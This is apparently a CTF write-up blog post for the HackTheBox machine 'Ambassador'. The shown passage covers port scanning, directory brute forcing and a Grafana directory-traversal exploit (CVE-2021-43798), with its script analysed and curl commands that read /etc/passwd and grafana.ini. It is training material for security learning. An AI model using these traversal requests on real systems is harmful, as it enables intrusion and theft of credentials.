@@ -1,0 +1,759 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Ambassador</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-ambassador">htb-ambassador</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#grafana">grafana</a> <a class="post-tag" href="/tags#searchsploit">searchsploit</a> <a class="post-tag" href="/tags#cve-2021-43798">cve-2021-43798</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#directory-traversal">directory-traversal</a> <a class="post-tag" href="/tags#consul">consul</a> <a class="post-tag" href="/tags#msfconsole">msfconsole</a> <a class="post-tag" href="/tags#tunnel">tunnel</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-01-28T14:45:00+00:00" itemprop="datePublished">Jan 28, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/01/28/htb-ambassador.html" style="color: #e6e6e6; text-decoration: none;">HTB: Ambassador</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/ambassador-cover.webp" type="image/webp"/>
+<img alt="Ambassador" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/ambassador-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Ambassador starts off with a Grafana instance. I’ll exploit a directory traversal / file read vulnerability to read the config and get the password for the admin. From the Grafana admin panel, I’ll get creds to the MySQL instance. Logging into that leaks credentials for a developer and I can get a shell with SSH. This developer has access to a git repo that leaks a token used for Consul in an old commit. I’ll use that to interact with Consul and get execution as root. I’ll show doing it both manually as well as using Metasploit.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/499 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/ambassador" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Ambassador</a> <a href="https://hackthebox.com/machines/ambassador" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-ambassador.webp" type="image/webp"/> <img alt="Ambassador" class="img-av" src="/icons/box-ambassador.png"/></picture></a><br/><a href="https://hackthebox.com/machines/ambassador" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1575150592976101381">01 Oct 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">28 Jan 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/ambassador-diff.webp" type="image/webp"/><img alt="Rated difficulty for Ambassador" src="/img/ambassador-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/ambassador-radar.webp" type="image/webp"/><img alt="Radar chart for Ambassador" src="/img/ambassador-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:12:13</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:27:33</span><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/24906" rel="noopener" target="_blank"><img alt="DirectRoot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/24906" style="display: unset"/><span class="user-text" style="display: none"> DirectRoot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds four open TCP ports, SSH (22), two HTTP (80, 3000), and MySQL (3306):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.183
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-15 17:58 UTC
+Nmap scan report for 10.10.11.183
+Host is up (0.086s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+3306/tcp open  mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,3000,3306 <span class="nt">-sCV</span> 10.10.11.183
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-15 17:58 UTC
+Nmap scan report for 10.10.11.183
+Host is up (0.086s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Hugo 0.94.2
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Ambassador Development Server
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Thu, 15 Sep 2022 18:02:33 GMT
+|     Content-Length: 29
+|     href="/login"&gt;Found&lt;/a&gt;.
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Thu, 15 Sep 2022 18:02:01 GMT
+|     Content-Length: 29
+|     href="/login"&gt;Found&lt;/a&gt;.
+|   HTTPOptions: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Thu, 15 Sep 2022 18:02:06 GMT
+|_    Content-Length: 0
+3306/tcp open  nagios-nsca Nagios NSCA
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.30-0ubuntu0.20.04.2
+|   Thread ID: 9
+|   Capabilities flags: 65535
+|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, InteractiveClient, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolNew, FoundRows, LongPassword, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: @*^
+| PRh\x02^\x0B\x1A]H!Yx\x1Fi+\x0E
+|_  Auth Plugin Name: caching_sha2_password
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.80%I=7%D=9/15%Time=632367DF%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
+SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
+SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
+SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
+SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
+SF:ion:\x201;\x20mode=block\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2018:02
+SF::01\x20GMT\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\"/login\"&gt;Found&lt;
+SF:/a&gt;\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
+SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
+SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
+SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
+SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Th
+SF:u,\x2015\x20Sep\x202022\x2018:02:06\x20GMT\r\nContent-Length:\x200\r\n\
+SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
+SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
+SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
+SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
+SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
+SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
+SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
+SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
+SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
+SF:\x20mode=block\r\nDate:\x20Thu,\x2015\x20Sep\x202022\x2018:02:33\x20GMT
+SF:\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\"/login\"&gt;Found&lt;/a&gt;\.\n\n"
+SF:);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.80 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 20.04 focal.</p>
+<p>Not much I can do with SSH or MySQL without creds, so I’ll revisit later if I find some.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is a blog with one post from Ambassador Inc:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220913094455480.webp" type="image/webp"/>
+<img alt="image-20220913094455480" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220913094455480.png"/>
+</picture>
+<p>Clicking “read more” gives the post:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220913094929444.webp" type="image/webp"/>
+<img alt="image-20220913094929444" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220913094929444.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP headers show Apache but not much else:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 15 Sep 2022 18:04:16 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.41 (Ubuntu)</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Fri, 02 Sep 2022 01:37:04 GMT</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"1234-5e7a7c4652f79-gzip"</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4660</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+</code></pre></div></div>
+<p>There is a <code class="language-plaintext highlighter-rouge">meta</code> tag in the HTML headers that shows Hugo:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"generator"</span> <span class="na">content=</span><span class="s">"Hugo 0.94.2"</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+<p>Hugo is a static site generator, and a good hint that there’s probably not a lot of interactive stuff on this page.</p>
+<p>The root page also loads as <code class="language-plaintext highlighter-rouge">index.html</code>, which makes sense given it’s coming from a static site generator.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.183
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.7.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.183
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.7.1
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      155l      305w     3654c http://10.10.11.183/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      313c http://10.10.11.183/images =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.183/images/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      311c http://10.10.11.183/tags =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.183/tags/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      317c http://10.10.11.183/categories =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.183/categories/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      312c http://10.10.11.183/posts =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.183/posts/</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c http://10.10.11.183/server-status
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 52s   180000/180000  0s      </span><span class="feroxbuster-green">found</span><span class="go">:6       </span><span class="feroxbuster-red">errors</span><span class="go">:59752  
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s    30000/30000   602/s   http://10.10.11.183 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s    30000/30000   604/s   http://10.10.11.183/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     30000/30000   0/s     http://10.10.11.183/images =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go"> (add -e to scan)
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s    30000/30000   604/s   http://10.10.11.183/tags 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s    30000/30000   607/s   http://10.10.11.183/categories 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s    30000/30000   605/s   http://10.10.11.183/posts 
+</span></code></pre></div></div>
+<p>Nothing interesting.</p>
+<h3 id="grafana---tcp-3000">Grafana - TCP 3000</h3>
+<p>This server has an instance of <a href="https://grafana.com/">Grafana</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220913095308633.webp" type="image/webp"/>
+<img alt="image-20220913095308633" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220913095308633.png"/>
+</picture>
+<p>At the bottom of the page, it shows version <code class="language-plaintext highlighter-rouge">v8.2.0 (d7f71e9eae)</code>.</p>
+<h2 id="shell-as-developer">Shell as developer</h2>
+<h3 id="file-read">File Read</h3>
+<h4 id="identify-exploit">Identify Exploit</h4>
+<p><code class="language-plaintext highlighter-rouge">searchsploit</code> shows two vulnerabilities associated with Grafana:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>searchsploit grafana
+<span class="go">----------------------------------------------------- ---------------------------------
+ Exploit Title                                       |  Path
+----------------------------------------------------- ---------------------------------
+Grafana 7.0.1 - Denial of Service (PoC)              | linux/dos/48638.sh
+Grafana 8.3.0 - Directory Traversal and Arbitrary Fi | multiple/webapps/50581.py
+----------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</span></code></pre></div></div>
+<p>The one in 8.3.0 is labeled directory traversal and arbitrary file read. That version is one minor version up from what’s running on Ambassador, which is close enough that I should try it.</p>
+<p>A bit more research shows that this is <a href="https://nvd.nist.gov/vuln/detail/cve-2021-43798">CVE-2021-43798</a>.</p>
+<h4 id="exploit-analysis">Exploit Analysis</h4>
+<p>I’ll grab a copy of the exploit script to take a look with <code class="language-plaintext highlighter-rouge">searchsploit -m multiple/webapps/50581.py</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">main</code> just takes a host and then passed that to <code class="language-plaintext highlighter-rouge">exploit</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">"</span><span class="s">Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-H</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">host</span><span class="sh">'</span><span class="p">,</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Target host</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="nf">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">return</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">exploit</code> drops into a <code class="language-plaintext highlighter-rouge">while True</code> loop, reading a file, and then fetching it with a random choice from a long list of plugins:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.</span><span class="sh">'</span> <span class="p">}</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">file_to_read</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">'</span><span class="s">Read file &gt; </span><span class="sh">'</span><span class="p">)</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">host</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/public/plugins/</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">choice</span><span class="p">(</span><span class="n">plugin_list</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/../../../../../../../../../../../../..</span><span class="sh">'</span> <span class="o">+</span> <span class="n">file_to_read</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="n">prep</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="nf">prepare</span><span class="p">()</span>
+            <span class="n">prep</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">prep</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="sh">'</span><span class="s">Plugin file not found</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] File not found</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                    <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] Something went wrong.</span><span class="sh">'</span><span class="p">)</span>
+                    <span class="k">return</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">ConnectTimeout</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] Request timed out. Please check your host settings.</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">return</span>
+        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+            <span class="k">pass</span>
+</code></pre></div></div>
+<h4 id="poc">POC</h4>
+<p>Rather than use the script, I’ll grab a plugin at random from the list and try to access the URL on Ambassador with <code class="language-plaintext highlighter-rouge">curl</code> the same way it did in the script. I’ll use <code class="language-plaintext highlighter-rouge">--path-as-is</code> to prevent <code class="language-plaintext highlighter-rouge">curl</code> from fixing things like <code class="language-plaintext highlighter-rouge">../</code>. It fetches <code class="language-plaintext highlighter-rouge">/etc/passwd</code> successfully, showing file read:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
+<span class="go">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...[snip]...
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+grafana:x:113:118::/usr/share/grafana:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+consul:x:997:997::/home/consul:/bin/false
+</span></code></pre></div></div>
+<h3 id="grafana-access">Grafana Access</h3>
+<h4 id="grafanaini">grafana.ini</h4>
+<p>I can’t seem to read anything interesting in <code class="language-plaintext highlighter-rouge">/home/developer</code>, which suggests the webserver is running as another user (likely www-data).</p>
+<p>There’s not much of interested to pull from the Hugo site, and I can read <code class="language-plaintext highlighter-rouge">/var/www/html/index.html</code> as the main page.</p>
+<p>Grafana stores a config in <code class="language-plaintext highlighter-rouge">/etc/grafana/grafana.ini</code>, according to <a href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/">the docs</a>. I’m able to read it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini
+<span class="c">##################### Grafana Configuration Example #####################
+#
+# Everything has defaults so you only need to uncomment things you want to
+# change
+</span><span class="go">
+</span><span class="c"># possible values : production, development
+</span><span class="go">;app_mode = production
+
+</span><span class="c"># instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
+</span><span class="gp">;instance_name = $</span><span class="o">{</span>HOSTNAME<span class="o">}</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>In this config, <code class="language-plaintext highlighter-rouge">#</code> is used to write comments, where <code class="language-plaintext highlighter-rouge">;</code> is used to comment out configurations, telling Grafana to use the default for that setting. The config file is quite long, but some bits jump out. The “Paths” section gives some paths on the host:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#################################### Paths ####################################</span>
+<span class="o">[</span>paths]
+<span class="c"># Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)</span>
+<span class="p">;</span>data <span class="o">=</span> /var/lib/grafana
+
+<span class="c"># Temporary files in `data` directory older than given duration will be removed</span>
+<span class="p">;</span>temp_data_lifetime <span class="o">=</span> 24h
+
+<span class="c"># Directory where grafana can store logs</span>
+<span class="p">;</span>logs <span class="o">=</span> /var/log/grafana
+
+<span class="c"># Directory where grafana will automatically scan and look for plugins</span>
+<span class="p">;</span>plugins <span class="o">=</span> /var/lib/grafana/plugins
+
